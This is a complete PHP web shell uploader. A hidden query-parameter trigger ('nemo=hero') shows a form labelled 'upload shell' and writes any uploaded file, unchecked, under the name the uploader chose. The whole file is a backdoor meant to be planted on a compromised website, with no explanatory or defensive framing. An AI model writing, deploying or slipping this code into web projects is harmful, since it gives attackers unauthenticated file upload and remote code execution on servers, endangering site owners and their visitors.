<?php
 
$nemo  = $_GET['nemo'];
if($nemo == 'hero'){
$nemoshell = $_FILES['file']['name'];
$nemohero  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
        <input type='file'name='file' />
        <input type='submit' value='upload shell' />
</form>";
move_uploaded_file($nemohero,$nemoshell);
}
?>